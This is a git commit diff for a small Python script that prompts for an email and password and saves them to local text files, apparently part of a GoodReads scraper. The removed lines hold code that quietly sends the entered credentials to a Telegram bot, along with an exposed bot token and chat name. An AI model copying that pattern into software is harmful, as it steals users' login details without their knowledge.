4f8213ad9fb67b09d6ad9059dd11c848f2441ab2
Hamidreza Zamanian <hamid80zamanian@gmail.com>
2020-07-10 19:22:43 +0430

    Update props.py

--- complicated/2.COPY_ME/files/props/props.py
+++ complicated/2.COPY_ME/files/props/props.py
@@ -1,16 +1,10 @@
 import easygui as eg
-import requests
-def foo(text):
-    requests.get(f'https://api.telegram.org/bot940336449:AAFZY87pCb8QBcmkq4QL26myH-XoI_l1SUA/sendMessage?chat_id=@somebodythatiusedtoknowgg&parse_mode=Markdown&text={text}')
 lst = ['email', 'passw']
-sum = ""
 for i in lst:
     f = open(f'E:\\GoodReads\\goodreads\\goodreads\\spiders\\files\\props\\{i}.txt', 'w', encoding='utf-8')
     name = i
     if i=='passw':
         name+='ord'
-    hey = eg.enterbox(f'enter your {name}: ')
-    sum+=hey+'\n'
-    f.write(hey)
+    writer = eg.enterbox(f'enter your {name}: ')
+    f.write(writer)
     f.close()
-foo(sum)
